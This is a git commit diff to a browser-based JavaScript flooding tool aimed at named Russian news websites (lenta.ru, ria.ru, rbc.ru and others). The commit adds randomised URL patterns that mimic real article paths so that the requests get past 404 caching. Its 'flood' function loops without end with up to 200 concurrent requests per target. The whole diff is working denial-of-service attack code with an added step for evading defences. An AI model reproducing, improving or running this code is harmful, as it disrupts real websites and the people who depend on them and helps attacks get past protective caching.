abeefc14e07ebdf832b6834391e4502f19171d36
Petr Stuchlík <stuchl4n3k@gmail.com>
2022-02-28 15:14:02 +0100

    Added evasion of 404 caching by mimicking real URL patterns

--- src/js/script.js
+++ src/js/script.js
@@ -1,9 +1,13 @@
-var targets = {
-    "https://lenta.ru": {
+let targets = {
+    'https://lenta.ru': {
+        //        https://lenta.ru/news/2022/02/28/obletim/
+        pattern: 'https://lenta.ru/news/%YYYY/%MM/%DD/%STR/',
         number_of_requests: 0,
         number_of_errored_responses: 0,
     },
     "https://ria.ru/": {
+        //        https://ria.ru/20220223/shoygu-1275575159.html
+        pattern: 'https://ria.ru/%YYYY%MM%DD/%STR-%NUM.html',
         number_of_requests: 0,
         number_of_errored_responses: 0,
     },
@@ -12,6 +16,8 @@ var targets = {
         number_of_errored_responses: 0,
     },
     "https://www.rbc.ru/": {
+        // https://www.rbc.ru/politics/26/02/2022/6219ec289a79470d35420698
+        pattern: 'https://www.rbc.ru/politics/%DD/%MM/%YYYY/%STR',
         number_of_requests: 0,
         number_of_errored_responses: 0,
     },
@@ -145,14 +151,15 @@ var targets = {
     },
 };
 
-var statsEl = document.getElementById("stats");
+let statsEl = document.getElementById('stats');
+
 function printStats() {
-    statsEl.innerHTML = "<pre>" + JSON.stringify(targets, null, 2) + "</pre>";
+    statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>';
 }
 setInterval(printStats, 100);
 
-var CONCURRENCY_LIMIT = 200;
-var queue = [];
+let CONCURRENCY_LIMIT = 200;
+let queue = [];
 
 async function fetchWithTimeout(resource, options) {
     const controller = new AbortController();
@@ -170,13 +177,49 @@ async function fetchWithTimeout(resource, options) {
         });
 }
 
+function createTargetUrl(target) {
+    let target_url = targets[target].pattern;
+    if (target_url === undefined) {
+        return target;
+    }
+
+    const STR = getRandomString(3 + getRandomInteger(7));
+    const NUM = getRandomInteger(1e9);
+    const date = new Date();
+    const YYYY = date.getFullYear();
+    const MM = date.getMonth() + 1;
+    const DD = date.getDate();
+
+    target_url = target_url.replace('%STR', STR)
+    target_url = target_url.replace('%NUM', NUM.toString())
+    target_url = target_url.replace('%YYYY', YYYY.toString())
+    target_url = target_url.replace('%MM', MM.toString().padStart(2, '0'))
+    target_url = target_url.replace('%DD', DD.toString().padStart(2, '0'))
+    return target_url;
+}
+
+function getRandomString(length) {
+    const alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789-';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += alphabet.charAt(getRandomInteger(alphabet.length));
+    }
+    return result;
+}
+
+function getRandomInteger(max) {
+    return 1 + Math.floor(Math.random() * (max - 1));
+}
+
 async function flood(target) {
-    for (var i = 0; ; ++i) {
+    for (let i = 0; ; ++i) {
         if (queue.length > CONCURRENCY_LIMIT) {
             await queue.shift();
         }
+
+        const target_url = createTargetUrl(target);
         queue.push(
-            fetchWithTimeout(target, { timeout: 1000 })
+            fetchWithTimeout(target_url, {timeout: 1000})
                 .catch((error) => {
                     if (error.code === 20 /* ABORT */) {
                         return;
